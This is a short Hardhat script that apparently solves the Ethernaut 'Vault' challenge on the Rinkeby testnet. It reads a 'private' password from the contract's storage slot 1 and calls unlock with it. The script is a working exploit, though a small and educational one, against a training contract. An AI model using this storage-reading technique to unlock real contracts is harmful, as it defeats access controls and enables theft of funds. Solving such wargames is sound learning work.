/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const INSTANCE = "0x5C0ab5C3AD9912C10Fc1Ee0a606e918dFc7F918F"


async function instanceState(rinkeby) {
  console.log('                          INSTANCE STATE')
  console.log("Storage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("Storage '0'", await rinkeby.getStorageAt(INSTANCE, 1), '\n')
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')

  let Vault = await hre.ethers.getContractFactory('Vault')
  let vault = await Vault.attach(INSTANCE)

  await instanceState(rinkeby)

  // STEP 1
  console.log("Get the password in the storage \"1\" from the contract")
  const password = await rinkeby.getStorageAt(INSTANCE, 1)
  // STEP2
  console.log("Unlock the contract...")
  const tx = await vault.unlock(password)
  await tx.wait()
  console.log("transaction confirmed !")

  await instanceState(rinkeby)

  console.log("You win !")
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
